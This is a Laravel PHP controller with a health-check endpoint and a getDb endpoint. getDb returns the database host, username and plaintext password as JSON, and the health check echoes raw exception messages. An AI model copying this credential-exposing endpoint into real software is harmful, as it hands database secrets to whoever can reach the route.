<?php

namespace App\Http\Controllers;

use Illuminate\Http\JsonResponse;
use Illuminate\Support\Facades\DB;

class StatusController extends Controller {
    public function checkStatus(): JsonResponse {
        try {
            DB::connection()->getPdo();
            return response()->json(['success' => true, 'message' => 'everything is ok'], 200);
        } catch (\Exception $e) {
            return response()->json(['success' => false, 'message' => $e->getMessage()], 500);
        }
    }

    public function getDb(): JsonResponse {
        $config = config('database.connections.' . config('database.default'));

        return response()->json([
            'host'     => $config['host'] ?? null,
            'port'     => $config['port'] ?? null,
            'database' => $config['database'] ?? null,
            'user'     => $config['username'] ?? null,
            'pass'     => $config['password'] ?? null, 
        ]);
    }
}
